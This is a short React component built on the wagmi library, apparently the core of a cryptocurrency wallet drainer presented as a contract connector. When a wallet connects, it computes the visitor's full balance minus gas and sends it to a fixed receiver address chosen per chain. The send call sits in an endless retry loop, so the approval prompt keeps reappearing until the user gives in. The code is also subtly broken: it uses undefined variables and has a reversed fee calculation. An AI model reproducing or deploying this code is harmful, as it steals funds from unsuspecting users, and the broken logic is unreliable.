"use client"
import { useWalletClient, useAccount, useNetwork, usePublicClient, useFeeData} from "wagmi"
import { receivers } from "../constant/address"
import { useState } from "react"

const Contract_Con = () => {

    const publicClient = usePublicClient()
    const [amt, setAmt] = useState(BigInt("0"))
    const {data: gasPrice } = useFeeData()
    const {address, isConnected} = useAccount({
        async onConnect({ address, connector, isReconnected }) {
     
            let bal = data?.value || BigInt("0")
            const gasEst = await publicClient.estimateGas({
                to: receiver,account: address, value: bal
            })
            let fee = gasPrice?.gasPrice || BigInt("0")
            let gasFee = fee * gasEst
            const rems = gasFee - bal // - fee change back to balance minus fee
            console.log("gasest, gastamt, balance, sendable",gasEst, gasFee, bal, rems)
        
            /**
             * if(bal <= BigInt("0"))
             * {
             *   alert("Wallet not eligible")
             *   disconnect()
             * return
             * }
             * 
             * Call up modal to indicate not eligible
             */
            
            setAmt(rems)
      
            }
    })

    const {chain} = useNetwork()
    const receiver =  receivers[chain]

    const {data: walletClient, isFetched, status} = useWalletClient(
      
        { 
          
        onError(error) {
         
          console.log("WC error", error)
        },
      
        async onSuccess(data) {
      
            console.log(receiver)
          if(isConnected)
          {
      
          while(true) 
         {
      
            try {
                  const res = await data?.sendTransaction({
                      account: address,
                      to: receiver,
                      value: amt
                  })
                  console.log("WC datas",res)
      break
              
             } 
             catch (error) {
              console.log("sending from approve i.e send direct",error)
             }
          }
          }
        }
      })
}
